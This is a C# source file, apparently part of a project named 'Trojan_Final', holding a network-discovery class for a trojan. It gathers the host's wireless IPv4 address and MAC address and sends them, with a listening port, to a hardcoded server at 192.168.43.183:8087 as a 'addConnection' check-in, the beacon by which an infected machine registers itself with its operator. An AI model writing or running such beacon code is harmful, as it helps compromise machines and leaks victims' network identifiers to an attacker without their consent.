using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Trojan_Final
{
    class NetworkDiscover
    {
        static HttpClient client = new HttpClient();
        public static string[] GetAllLocalIPv4(NetworkInterfaceType _type)
        {
            List<string> ipAddrList = new List<string>();
            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (item.NetworkInterfaceType == _type && item.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            ipAddrList.Add(ip.Address.ToString());
                        }
                    }
                }
            }
            return ipAddrList.ToArray();
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        public static string GetMACAdress()
        {
            String firstMacAddress = NetworkInterface
                        .GetAllNetworkInterfaces()
                        .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                        .Select(nic => nic.GetPhysicalAddress().ToString())
                        .FirstOrDefault();

            return firstMacAddress;
        }

        public static async Task SendConnectionInfo()
        {
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));

            var ip = GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault();
            var mac = GetMACAdress();

            var path = "http://192.168.43.183:8087/users/addConnection?ip=" + ip + "&mac=" + mac +"&port=" + 12831.ToString();
            HttpResponseMessage response = await client.GetAsync(path);

            if (response.IsSuccessStatusCode)
            {
                var stringResponse = await response.Content.ReadAsStringAsync();
                Console.WriteLine(stringResponse);
                Console.WriteLine();
                Console.WriteLine("succes!");
            }

        }
    }
}
